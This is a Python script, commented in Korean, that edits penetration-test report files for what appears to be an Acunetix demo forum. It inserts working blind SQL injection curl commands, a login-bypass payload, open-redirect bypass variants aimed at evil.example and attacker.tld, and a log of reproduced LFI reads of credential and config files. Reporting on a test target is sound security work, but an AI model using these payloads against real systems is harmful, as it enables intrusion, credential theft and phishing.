#!/usr/bin/env python3
"""Round 14 — 보고서 산출물 정합성 수선 (드리프트 값·스테일 id 교체 + 재현성 이력·리다이렉트 분류 추가).
텍스트 치환만 한다(새 판단 없음). 실행 전 백업을 뜬다.
"""
import os
import re
import shutil

P = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
BK = os.path.join(P, "scratch", "round14", "backup_before_fix")
os.makedirs(BK, exist_ok=True)
FILES = ["PoC-코드.md", "Exploit-시나리오.md", "PoC-시나리오.md"]

for f in FILES:
    shutil.copy2(os.path.join(P, f), os.path.join(BK, f))
print("백업:", BK)

report = []


def edit(fname, pairs, label):
    path = os.path.join(P, fname)
    s = open(path, encoding="utf-8").read()
    for old, new in pairs:
        if old not in s:
            report.append(f"  !! 못 찾음 [{fname}] {label}: {old[:60]!r}")
            continue
        n = s.count(old)
        s = s.replace(old, new)
        report.append(f"  ok [{fname}] {label} ({n}곳)")
    open(path, "w", encoding="utf-8").write(s)


# ---------- 1. PoC-코드.md — 하드코딩된 TRUE 행수 제거 ----------
edit("PoC-코드.md", [
    ("| grep -c \"class='posttext'\"   # → 21 (TRUE)",
     "| grep -c \"class='posttext'\"   # → 0 초과 = TRUE (2026-09-23 실측 114행; 값은 변동하므로 '0 초과' 만 본다)"),
    ("| grep -c \"class='posttext'\"   # → 0  (FALSE)",
     "| grep -c \"class='posttext'\"   # → 0 = FALSE (이쪽이 판정 기준: 0 이냐 아니냐)"),
    ("((SELECT SYSTEM_USER)='acunetix'))--\" \"$BASE/search.asp\" | grep -c \"class='posttext'\"  # → 21 TRUE",
     "((SELECT SYSTEM_USER)='acunetix'))--\" \"$BASE/search.asp\" | grep -c \"class='posttext'\"  # → FALSE(0) 와 구분되면 TRUE"),
    ("((SELECT COUNT(*) FROM acuservice.dbo.users)>0))--\" \"$BASE/search.asp\" | grep -c \"class='posttext'\"   # → 21 TRUE",
     "((SELECT COUNT(*) FROM acuservice.dbo.users)>0))--\" \"$BASE/search.asp\" | grep -c \"class='posttext'\"   # → 0 초과 = TRUE"),
    ("name='users'))>=8))--\" \"$BASE/search.asp\" | grep -c \"class='posttext'\"  # → 21 TRUE",
     "name='users'))>=8))--\" \"$BASE/search.asp\" | grep -c \"class='posttext'\"  # → 0 초과 = TRUE"),
    ("((SELECT COUNT(*) FROM msdb.dbo.backupset)>0))--\" \"$BASE/search.asp\" | grep -c \"class='posttext'\"   # → 21 TRUE (백업 6건)",
     "((SELECT COUNT(*) FROM msdb.dbo.backupset)>0))--\" \"$BASE/search.asp\" | grep -c \"class='posttext'\"   # → 0 초과 = TRUE (백업 6건)"),
    ("        | grep -c \"class='posttext'\"; }   # 21 이상이면 TRUE, 0이면 FALSE",
     "        | grep -c \"class='posttext'\"; }   # 0 초과면 TRUE, 0이면 FALSE (절대 행수를 하드코딩하지 말 것)"),
], "TRUE 행수 드리프트")

# ---------- 2. PoC-코드.md — 스테일 id=9 → 현존 id 사용 + 탐색 단계 ----------
old_block = """# 4-2. showthread.asp?id=
curl -s -G --data-urlencode "id=9 AND 1=1" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\\n' # → 200 (게시글 2건 렌더)
curl -s -G --data-urlencode "id=9 AND 1=2" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\\n' # → 500

# 4-3. 값 추출 시연 — 우리가 만든 스레드의 게시글 수를 블라인드로 정확히 뽑는다
curl -s -G --data-urlencode "id=9 AND (SELECT COUNT(*) FROM posts WHERE threadid=9)>0" "$BASE/showthread.asp" | grep -c "class='posttext'"  # 2
curl -s -G --data-urlencode "id=9 AND (SELECT COUNT(*) FROM posts WHERE threadid=9)>2" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\\n' # 500 ⇒ 실제값 2"""
new_block = """# 4-2. 쓸 id 를 먼저 확보한다 (★ id 는 고정이 아니다 — 데모 DB 리셋·외부 사용으로 변동)
#      포럼 페이지의 링크에서 현존 스레드 id 를 뽑는다 (2026-09-23 실측: 포럼 0/1/2, 스레드 0~7)
TID=$(curl -s "$BASE/showforum.asp?id=0" | grep -o "showthread\\.asp?id=[0-9]*" | head -1 | grep -o "[0-9]*$")

# 4-3. id 파라미터 SQLi 오라클 (TRUE=200 / FALSE=500)
curl -s -G --data-urlencode "id=$TID AND 1=1" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\\n'  # → 200
curl -s -G --data-urlencode "id=$TID AND 1=2" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\\n'  # → 500

# 4-4. 값 추출 시연 — 그 스레드의 게시글 수를 블라인드로 뽑는다 (값을 하드코딩하지 말고 이분탐색)
curl -s -G --data-urlencode "id=$TID AND (SELECT COUNT(*) FROM posts WHERE threadid=$TID)>0" "$BASE/showthread.asp" | grep -c "class='posttext'"   # → 1 이상 = TRUE
curl -s -G --data-urlencode "id=$TID AND (SELECT COUNT(*) FROM posts WHERE threadid=$TID)>99" "$BASE/showthread.asp" -o /dev/null -w '%{http_code}\\n'  # → 500 ⇒ 실제값은 99 이하"""
edit("PoC-코드.md", [(old_block, new_block)], "스테일 id=9 교체")

# ---------- 3. Exploit-시나리오 / PoC-시나리오 — TRUE 행수 표현 ----------
edit("Exploit-시나리오.md", [
    ("TRUE = 게시글 21건 렌더 / FALSE = 0건.",
     "TRUE = 게시글 다수 렌더(2026-09-23 실측 114행) / FALSE = 0건. **절대 행수는 리셋·외부 사용으로 변동**하므로 '0 초과 = TRUE' 로만 판정한다."),
], "TRUE 행수")
edit("PoC-시나리오.md", [
    ("→ 게시글 21건 렌더(TRUE).", "→ 게시글 다수 렌더(TRUE; 2026-09-23 실측 114행)."),
], "TRUE 행수")

# ---------- 4. PoC-코드.md — 오픈 리다이렉트를 Logout 우선으로 + 4곳 분류 표 ----------
old_rd = """## 6. 오픈 리다이렉트 — `/Login.asp?RetURL=`

```bash
curl -s -D - -o /dev/null -X POST \\
  --data "tfUName=admin'--&tfUPass=x" \\
  "$BASE/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F" | grep -i '^location'
# → Location: http://example.com/

# 외부 도메인·프로토콜 상대 URL 모두 통과
# RetURL=https%3A%2F%2Fevil.example%2Fp  → Location: https://evil.example/p
# RetURL=%2F%2Fexample.com%2F           → Location: //example.com/
```"""
new_rd = """## 6. 오픈 리다이렉트 — `/Logout.asp?RetURL=` (권장 PoC) · `/Login.asp?RetURL=`

`RetURL` 취약 패턴은 4개 파일에 복제돼 있으나 **조건이 가장 약한 것은 Logout.asp** 다
(GET 한 방, 인증·본문 불필요). 보고서 대표 PoC 로는 이쪽을 쓴다.

```bash
# 6-1. ★ /Logout.asp — 무인증 · 단일 GET
curl -s -D - -o /dev/null "$BASE/Logout.asp?RetURL=http%3A%2F%2Fexample.com%2F" | grep -i '^location'
# → Location: http://example.com/

# 검증된 우회 변형 (전부 그대로 통과 — 검증·화이트리스트 없음, 2026-09-23 실측)
#   %2F%2Fevil.example%2Fp    → //evil.example/p
#   https%3A%2F%2Fattacker.tld%2Fphish → https://attacker.tld/phish
#   https%3Aexample.com       → https:example.com       (스킴만 지정)
#   %09%2F%2Fevil.example     → %09//evil.example       (탭 접두)
#   %2F%5Cevil.example        → /%5Cevil.example        (백슬래시 혼합)
# 대조군: 파라미터 없음 → Location: Default.asp

# 6-2. /Login.asp — POST 로그인 성공이 선행 조건
curl -s -D - -o /dev/null -X POST \\
  --data "tfUName=admin&tfUPass=x' OR '1'='1" \\
  "$BASE/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F" | grep -i '^location'
# → Location: http://example.com/
# (참고: GET 만으로는 리다이렉트되지 않음 → 200)
```

| 위치 | 조건 | 리다이렉트 | 판정 |
|---|---|---|---|
| **`/Logout.asp`** | **없음(무인증·GET)** | `Request.QueryString("RetURL")` 그대로 | ★ **대표 PoC** |
| `/Login.asp` | 로그인 POST 성공(자격증명 또는 SQLi 우회) | 동일 | 취약 |
| `/Register.asp` | 회원가입 POST 성공 | `Login.asp?RetURL=<값>` 로 **동일 호스트 전달** → 이후 로그인 필요 | 취약(2단계) |
| `/Templatize.asp` | — | 없음(링크 생성에만 사용, URL 인코딩됨) | 해당 없음 |"""
edit("PoC-코드.md", [(old_rd, new_rd)], "리다이렉트 분류")

# ---------- 5. PoC-코드.md — 재현성 검증 이력 부록 ----------
head = open(os.path.join(P, "PoC-코드.md"), encoding="utf-8").read()
verif = """

---

## 부록 2 — 재현성 검증 이력 (Round 14, 2026-09-23)

보고서의 모든 헤드라인 PoC 를 **같은 시점에 다시 실행해** 재현을 확인했다(읽기 전용 51요청).

| PoC | 재현 결과 |
|---|---|
| LFI `db.asp` | 200 / 2,908B · DB 자격증명 포함 — 재현 |
| LFI `win.ini` / `web.config` / `unattend.xml` | 200 / 2,739B · 3,138B · 7,052B — 재현(크기 동일) |
| `search.asp` boolean-blind | `(1=1)` → 다수 행 / `(1=2)` → **0행** — 재현 |
| `search.asp` 서브쿼리 오라클 | `SYSTEM_USER='acunetix'` TRUE — 재현 |
| `showforum.asp?id=N` SQLi | id 0·1·2 → `AND 1=1` 200 / `AND 1=2` 500 — 재현 |
| `showthread.asp?id=N` SQLi | id 0·1·2·3 → `AND 1=1` 200 / `AND 1=2` 500 — 재현 |
| `/Logout.asp?RetURL=` | 302 → 외부 URL(변형 6종 전부 통과) — 재현 |
| `/Login.asp?RetURL=` POST | 302 → 외부 URL — 재현 |
| `/_vti_cnf/Default.asp` | 200 / 926B · `vti_extenderversion:4.0.2.8912` — 재현 |
| `Register.asp` INSERT SQLi | 소스 결합 구조 유지 확인(Round 13 실증. 재현하려면 승인 후 행 삽입 필요) |
| 저장형 XSS | ★ **서버측 페이로드 소실**(DB 리셋) → 게시글을 다시 만들어야 재현됨. CDP 증거는 `screenshots/xss_proof.png` |

**변동하는 값(하드코딩 금지)**: `search.asp` TRUE 응답의 행수(실측 114 — 초기 라운드에서는 21이었다),
포럼/스레드 id, `users`·`posts` 행수. 판정은 항상 "**FALSE = 0행과 구분되는가**"로 한다.
"""
open(os.path.join(P, "PoC-코드.md"), "w", encoding="utf-8").write(head + verif)

print("\n".join(report))
print("PoC-코드.md 최종 크기:", os.path.getsize(os.path.join(P, "PoC-코드.md")))
